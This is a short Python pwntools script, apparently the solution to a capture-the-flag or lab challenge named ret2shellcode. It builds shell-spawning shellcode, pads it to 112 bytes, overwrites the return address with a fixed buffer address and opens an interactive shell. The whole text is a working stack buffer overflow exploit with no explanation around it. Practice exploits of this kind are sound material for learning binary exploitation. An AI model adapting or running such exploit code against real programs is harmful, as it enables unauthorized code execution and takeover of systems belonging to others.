from pwn import *

pro=process('./ret2shellcode')

shellcode = asm(shellcraft.sh())
shelladdr=0x804a080

pro.sendline(shellcode.ljust(112,'F')+p32(shelladdr))
pro.interactive()
